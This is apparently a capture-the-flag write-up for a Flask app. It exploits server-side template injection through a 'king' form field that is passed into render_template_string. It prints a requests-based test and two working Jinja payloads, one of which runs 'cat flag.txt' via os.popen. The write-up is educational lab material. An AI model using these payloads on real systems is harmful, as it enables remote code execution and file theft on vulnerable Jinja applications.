# Write-up for Easy Level

We get a form that lets us ask for a gift.  I shall skip over the
initial Recon / Play

We can also find the source on the ```/debug``` page using gobuster (or robots.txt)

## Identifying the SSTI

So we have:

  - Jinja
  - Un-sanitised User Input
  
Which means there could be SSTI. So we want to look for where user input gets put into the templates
(Before they get rendered)

This seems to be the right place as we are replacing the String contents with a kings name.

```
def showError(theKing = None):
    """
    Display an Error Message to the users
    """
    if not theKing:
        theKing = "Unknown King"
    return flask.render_template_string(errorPage.replace("WHO", theKing))
```

We could bugger about modifying the form in burp or whatever, but I will use requests

```
import requests
URL = "http://127.0.0.1:5000"
data = {"king": "{{ 4+4 }}"}
r = requests.post(URL, data)
print (r.text)
```

And we get Code Execution in the Response.

```
<h2>Error</h2>
<div class="alert alert-danger" role="alert">
ERROR:  8 is not a King
</div>
```

## Getting the Flag

Lets go for the standard code execution style thing
We end up with two possible payloads to find the flag...

  - ``` payload = {"king" : "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag.txt')['read']()}}" }```

  - ```payload = {"king": "{{ request['application']['__globals__']['__builtins__'].open('flag.txt').read() }}"}```
  

# Easter Egg.

There is also the "BoloRei" function.  (Its a xmas bread,  like a easter-egg i suppose)

If we ask the kings for a flag we get the following message

```
    flag
    Polite people might get what they want
```

Lets ask nicely.

```
    A flag please
    As you asked nicely. CUEH{TEMPFLAG}
```



